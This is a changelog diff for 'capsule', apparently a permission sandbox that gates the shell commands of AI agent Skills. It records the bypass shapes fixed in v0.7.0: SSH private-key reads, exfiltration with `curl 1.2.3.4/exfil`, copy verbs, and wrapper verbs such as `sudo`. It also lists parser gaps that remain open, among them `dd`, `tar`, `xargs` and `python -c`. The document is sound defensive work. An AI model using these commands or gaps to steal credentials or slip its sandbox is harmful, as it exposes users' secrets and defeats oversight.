@@ -7,6 +7,73 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.7.0] - 2026-10-27
+
+Multi-surface release: a shell command that touches several capability surfaces
+(a read, a redirect write, a network host) is now judged on **all** of them, and
+the wrapper and copy shapes that used to hide the real target are classified.
+Every shape below was reproduced ALLOWED under the headline `network-deny.yaml`
+profile (shell granted) before being fixed.
+
+### Fixed
+
+- **A redirect hid the command's own read/egress surface**
+  (`cat ~/.ssh/id_rsa > ./out/leak.txt`, `head -n 5 ~/.ssh/id_rsa > ./out/leak.txt`,
+  `curl 1.2.3.4/exfil > ./out/f.txt`, `wget 1.2.3.4/x > ./out/f.txt`,
+  `ssh buildbox > ./out/f.txt`, `nc buildbox 22 > ./out/f.txt`). `_parse_segment`
+  returned on the first redirect token before classifying the verb, and a
+  `CallRequest` could name only one path, so the in-scope redirect write was
+  judged alone: the private key was read, and IP/host egress went through, while
+  the `~/.ssh/**` deny and the network rule never fired. A `CallRequest` now
+  carries every surface the command touches (`CallRequest.extra`) and
+  `policy.decide` requires all of them to be permitted — the same fix closes the
+  case where an allow-listed egress host shadowed a denied read
+  (`curl https://api.internal/v1 && cat ~/.ssh/id_rsa`).
+
+- **`cp` / `mv` / `install` never surfaced a source or destination**
+  (`cp ~/.ssh/id_rsa ./out/key`, `mv ~/.ssh/id_rsa ./out/`,
+  `install -m 600 ~/.ssh/id_rsa ./out/k`). They were in no verb set, so the call
+  degraded to a bare, surface-less shell call — the key was read and copied into
+  the in-scope `./out/` tree the same profile lets the Skill read back. This is
+  the shape the v0.6.0 grill deferred until a request could carry two paths; the
+  copy verbs now surface the last positional as a write and the earlier ones as
+  reads.
+
+- **A command wrapper hid the wrapped command** (`sudo cat ~/.ssh/id_rsa`,
+  `doas`/`env`/`command`/`exec`/`nohup`/`nice`/`time`/`stdbuf`/`setsid cat
+  ~/.ssh/id_rsa`, `env FOO=1 cat ~/.ssh/id_rsa`, `sudo -u root cat
+  ~/.ssh/id_rsa`, `sudo curl 1.2.3.4/exfil`). The wrapper verb was unrecognised,
+  so the inner command was never inspected — the same wrapper class as the
+  v0.5.0 `bash -c` fix. Wrapper verbs are now unwrapped (flags, `KEY=value`
+  assignments, and a bare flag value are skipped) and the remainder classified;
+  an unrecognised remainder still degrades to a bare shell call, so
+  `sudo grep cat ./README.md` is not falsely denied.
+
+- **Version surfaces lagged the tag.** `README.md` and `README.en.md` advertised
+  `v0.5.0` on a `v0.6.0` tree, `docs/demo-results.json` recorded `0.5.0`, and
+  `CHANGELOG.md` had no `[0.6.0]` link reference with a stale
+  `[Unreleased]: .../compare/v0.5.0...HEAD` compare base (so the `## [0.6.0]`
+  heading was a dead anchor). All surfaces are now at 0.7.0 and the CHANGELOG
+  link references are complete.
+
+### Testing
+
+`tests/test_version_lockstep.py` now asserts every version surface agrees with
+`VERSION` (package constant, `pyproject.toml`, CHANGELOG head + link references +
+`[Unreleased]` base, both READMEs, `web/site.json`, `docs/demo-results.json`),
+so the drift that shipped at v0.4.0 and v0.6.0 fails the suite instead of
+shipping. 35 new regression tests across `tests/test_cli.py`,
+`tests/test_policy.py` and the lockstep guard; 95 → 133 tests.
+
+### Not addressed
+
+Shell-intent parsing stays deliberately shallow: verbs outside the classified
+sets (`dd`, `tar`, `ln`, `busybox`, …) and surface kinds outside the modelled
+ones (`<` input redirection, `xargs`-fed arguments, `python -c` payloads) still
+degrade to a bare `shell` call, which a profile that grants `shell` allows. A
+profile that does not grant `shell` denies them outright. Tightening this is a
+parser milestone of its own, not a v0.7.0 fix.
+
 ## [0.6.0] - 2026-09-19
 
 Bypass-hunt release: four same-class escapes of the v0.5.0 fixes, all
@@ -160,7 +227,9 @@ over-blocking. 87 → 95 tests.
 - **m3 — ship demo**: reproducible `curl-exfil-demo` Skill plus a quickstart so a
   user sees a real block in under five minutes.
 
-[Unreleased]: https://github.com/SuperMarioYL/capsule/compare/v0.5.0...HEAD
+[Unreleased]: https://github.com/SuperMarioYL/capsule/compare/v0.7.0...HEAD
+[0.7.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.7.0
+[0.6.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.6.0
 [0.5.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.5.0
 [0.4.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.4.0
 [0.3.0]: https://github.com/SuperMarioYL/capsule/releases/tag/v0.3.0
